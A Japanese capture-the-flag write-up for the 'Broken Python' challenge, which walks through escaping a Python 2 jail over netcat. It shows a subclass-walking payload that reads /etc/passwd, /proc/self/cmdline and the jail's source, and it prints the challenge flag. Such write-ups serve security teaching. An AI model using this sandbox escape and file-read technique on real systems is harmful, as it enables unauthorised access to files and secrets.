# Broken Python:Miscellanous:380pts
Please help me read the flag. I thought I knew python but this python shell is broken.  
nc 143.198.224.219 9999  
![pythonshell.jpeg](images/pythonshell.jpeg)  
S'il vous plaît, aidez-moi à lire le drapeau. Je pensais connaître python mais ce terminal python est ne fonctionne pas!  
nc 143.198.224.219 9999  
`143.198.224.219:9999`  
Hint  
The trick is to correctly use classes and/or subclasses.  
Hint  
Use python in a special fashion to read flag.txt located in the current directory.  

# Solution
接続先が渡されるので、ncで接続する。  
```bash
$ nc 143.198.224.219 9999
Find the flag.
>>> print(1)
1
>>> print(flag)
You have encountered an error.
>>> print(chr(65))
You have encountered an error.
>>> __import__("os").system("ls")
You have encountered an error.
>>> print 2
2
```
python2が動いているようだ。  
エラーが出るものやブラックリストであると`You have encountered an error.`と出力される。  
この手のpythonサンドボックスは「python jail technique」と検索すると、いろいろと情報が見つかる。  
手始めに[Bypass Python sandboxes - HackTricks](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)を試すとよい。  
`().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()`でエラーが出なかった。  
```bash
>>> ().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
>>> print(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read())
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
~~~
>>> print(().__class__.__bases__[0].__subclasses__()[40]('flag.txt').read())
The flag is in the source code.
```
任意のファイルが読み出せるが、フラグはflag.txtではなく、実行されている.pyファイルに書かれているようだ。  
ファイル名を特定する必要がある。  
`/proc/self/cmdline`を読むか、様々な入力を試した結果sysが使えることが分かっていたので`print(sys.argv[0])`を実行すれば良い。  
```bash
>>> print(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/cmdline').read())
/usr/local/bin/pythonjail.py
>>> print(sys.argv[0])
jail.py
```
`jail.py`と分かったので読み取る。  
```bash
>>> print(().__class__.__bases__[0].__subclasses__()[40]('jail.py').read())
#!/usr/bin/python
~~~

def flag_function():
    flag = "OFPPT-CTF{py7h0n_br34k_1s_l1k3_pr1s0n_br34k_sh0w}"

~~~
```
flagが得られた。  

## OFPPT-CTF{py7h0n_br34k_1s_l1k3_pr1s0n_br34k_sh0w}